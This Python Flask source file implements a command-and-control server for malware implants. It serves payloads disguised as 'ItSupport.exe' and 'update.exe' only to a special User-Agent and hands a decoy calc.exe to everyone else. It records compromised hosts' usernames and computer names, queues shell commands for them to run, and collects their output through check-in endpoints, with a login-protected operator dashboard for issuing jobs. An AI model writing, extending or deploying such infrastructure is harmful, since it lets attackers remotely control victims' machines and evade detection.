from flask import Flask, request, Response,send_from_directory, abort, render_template, redirect, Blueprint, flash
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
from dataclasses import dataclass
from werkzeug.security import generate_password_hash, check_password_hash
from flask_login import UserMixin, LoginManager, login_user, login_required, logout_user, current_user
import os
import yaml

app = Flask(__name__, static_url_path='')
auth = Blueprint('auth', __name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///test.db'
db = SQLAlchemy(app)
app.config['SECRET_KEY'] = 'hjshjhdjah kjshkjdhjs'
app.config['EXECUTABLES'] = 'static/resources/exe/'

app.register_blueprint(auth, url_prefix='/')
login_manager = LoginManager()
login_manager.login_view = '/login'
login_manager.init_app(app)

@login_manager.user_loader
def load_user(id):
    return User.query.get(int(id))

with open("config.yaml", "r") as stream:
    try:
        appConfig = yaml.safe_load(stream)
    except yaml.YAMLError as exc:
        print(exc)
        
@dataclass
class Implant(db.Model):
    guid: str
    computerName: str
    username: str
    ip: str
    mac: str
    lastSeen: datetime
    dateCreated: datetime

    guid = db.Column(db.String(80), primary_key=True)
    computerName = db.Column(db.String(80))
    username = db.Column(db.String(80))
    ip = db.Column(db.String(80), unique=True)
    mac = db.Column(db.String(80), unique=True)
    lastSeen = db.Column(db.DateTime, default=datetime.utcnow)
    dateCreated = db.Column(db.DateTime, default=datetime.utcnow)

    def __init__(self, guid, computerName, username):
        self.guid = guid
        self.computerName = computerName
        self.username = username

    def __repr__(self):
        return '<Implant %r>' % self.guid

@dataclass
class Job(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    implantId = db.Column(db.Integer)
    command = db.Column(db.String(200))
    status = db.Column(db.String(80), default="TBD")
    response = db.Column(db.String(80))

    def __init__(self, implantId, command):
        self.implantId = implantId
        self.command = command

    def __repr__(self):
        return '<Task %r>' % self.id

class User(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(150), unique=True)
    password = db.Column(db.String(150))
    first_name = db.Column(db.String(150))

    def __init__(self, email, password, first_name):
        self.email = email
        self.password = password
        self.first_name = first_name

    def __repr__(self):
        return '<Task %r>' % self.id

@app.route('/')
@login_required
def index():
    implants = Implant.query.order_by(Implant.dateCreated).all()
    return render_template('index.html', implants=implants)

@app.route('/ItSupport.exe')
def stager():
    uploads = os.path.join(app.root_path, app.config['EXECUTABLES'])
    print(os.path.abspath(uploads))
    if(request.headers.get('User-Agent') == 'ch0nky'):
        try:
            return send_from_directory(os.path.abspath(uploads), "ItSupport.exe")
        except FileNotFoundError:
            abort(404)
    else:
        try:
            return send_from_directory(os.path.abspath(uploads), "calc.exe")
        except FileNotFoundError:
            abort(404)

@app.route('/update.exe')
def implant():
    uploads = os.path.join(app.root_path, app.config['EXECUTABLES'])
    print(os.path.abspath(uploads))
    if(request.headers.get('User-Agent') == 'ch0nky'):
        try:
            return send_from_directory(os.path.abspath(uploads), "update.exe")
        except FileNotFoundError:
            abort(404)
    else:
        try:
            return send_from_directory(os.path.abspath(uploads), "calc.exe")
        except FileNotFoundError:
            abort(404)

@app.route('/register', methods=['POST'])
def register():
    data = request.form
    implantId = bytes.fromhex(data['guid']).decode("ASCII")
    new_instance = Implant(implantId, bytes.fromhex(data['username']).decode("ASCII"), bytes.fromhex(data['computerName']).decode("ASCII"))
    try:
        for command in appConfig["commands"]:
            job = Job(implantId,command)
            db.session.add(job)
        newjob = Job.query.filter_by(implantId=implantId).filter_by(status="TBD").first()
        newjob.status = "STARTED"
        newCommand = newjob.command
        db.session.add(new_instance)
        db.session.commit()
    except:
        return Response(status=500, mimetype='application/json')
    return Response(newCommand, status=201, mimetype='text/html; charset=utf-8')

@app.route('/register.php', methods=['POST'])
def registerPHP():
    data = request.form
    hexData = bytes.fromhex(data['hex']).decode("ASCII")
    dataMap = hexData.split("&")
    dataDict = {'key': 'value'}
    for map in dataMap:
        x = map.split('=')
        dataDict[x[0]]= x[1]
    new_instance = Implant(dataDict['guid'], dataDict['user'], dataDict['computer'])
    try:
        for command in appConfig["commands"]:
            job = Job(dataDict['guid'],command)
            db.session.add(job)
        db.session.add(new_instance)
        db.session.commit()
    except:
        return Response("OK", status=200, mimetype='text/html; charset=utf-8')
    return Response("OK", status=200, mimetype='text/html; charset=utf-8')

@app.route('/checkin.php', methods=['POST'])
def checkinPHP():
    guid = request.headers.get('Authorization')
    data = request.form
    decoded = bytes.fromhex(data['hex']).decode("ASCII")
    implant = Implant.query.get_or_404(guid)
    implant.lastSeen = datetime.now()
    currentJobExists = Job.query.filter_by(implantId=guid).filter_by(status="STARTED").scalar() is not None
    if currentJobExists:
        job = Job.query.filter_by(implantId=guid).filter_by(status="STARTED").first()
        job.response = decoded
        job.status = "DONE"
    nextJobExists = Job.query.filter_by(implantId=guid).filter_by(status="TBD").first() is not None
    if nextJobExists:
        nextJob = Job.query.filter_by(implantId=guid).filter_by(status="TBD").first()
        nextJob.status = "STARTED"
    try:
        db.session.commit()
    except:
        return Response(status=200, mimetype='application/json')
    try:
        nextJob
        return Response(nextJob.command, status=200, mimetype='text/html; charset=utf-8')
    except:
        return Response(status=200, mimetype='text/html; charset=utf-8')

@app.route('/checkin/<guid>', methods=['POST'])
def checkin(guid):
    data = request.form
    decoded = bytes.fromhex(data['hex']).decode("ASCII")
    implant = Implant.query.get_or_404(guid)
    implant.lastSeen = datetime.now()
    currentJobExists = Job.query.filter_by(implantId=guid).filter_by(status="STARTED").scalar() is not None
    if currentJobExists:
        job = Job.query.filter_by(implantId=guid).filter_by(status="STARTED").first()
        job.response = decoded
        job.status = "DONE"
    nextJobExists = Job.query.filter_by(implantId=guid).filter_by(status="TBD").first() is not None
    if nextJobExists:
        nextJob = Job.query.filter_by(implantId=guid).filter_by(status="TBD").first()
        nextJob.status = "STARTED"
    try:
        db.session.commit()
    except:
        return Response(status=500, mimetype='application/json')
    try:
        nextJob
        return Response(nextJob.command, status=201, mimetype='text/html; charset=utf-8')
    except:
        return Response(status=201, mimetype='text/html; charset=utf-8')

@app.route('/jobs/<guid>')
@login_required
def jobs(guid):
    jobs = Job.query.filter_by(implantId=guid).all()
    return render_template('details.html', jobs=jobs)

@app.route('/job/add/<guid>', methods=['POST'])
@login_required
def addJobs(guid):
    command = request.form['command']
    job = Job(guid,command)
    try:
        db.session.add(job)
        db.session.commit()
    except:
        flash('Error creating a job for the implant. Try again.', category='error')
        return redirect('/')
    flash('Job added!', category='success')
    return redirect('/')

@app.route('/delete/<guid>')
@login_required
def delete(guid):
    implant = Implant.query.get_or_404(guid)
    jobs = Job.query.filter_by(implantId=guid).all()
    try:
        for job in jobs:
            db.session.delete(job)
        db.session.delete(implant)
        db.session.commit()
        flash('Implant deleted!', category='success')
        return redirect('/')
    except:
        flash('Error deleting implant. Try again.', category='error')
        return redirect('/')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')

        user = User.query.filter_by(email=email).first()
        if user:
            if check_password_hash(user.password, password):
                flash('Logged in successfully!', category='success')
                login_user(user, remember=True)
                return redirect('/')
            else:
                flash('Incorrect password, try again.', category='error')
        else:
            flash('Email does not exist.', category='error')

    return render_template("login.html", user=current_user)

@app.route('/sign-up', methods=['GET', 'POST'])
def sign_up():
    if request.method == 'POST':
        email = request.form.get('email')
        first_name = request.form.get('firstName')
        password1 = request.form.get('password1')

        user = User.query.filter_by(email=email).first()
        if user:
            flash('Email already exists.', category='error')
        else:
            new_user = User(email=email, first_name=first_name, password=generate_password_hash(
                password1, method='sha256'))
            db.session.add(new_user)
            db.session.commit()
            login_user(new_user, remember=True)
            flash('Account created!', category='success')
            return redirect('/')

    return render_template("sign-up.html", user=current_user)

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect('/login')

if __name__ == "__main__":
    app.run(host="localhost", port=8050, debug=True)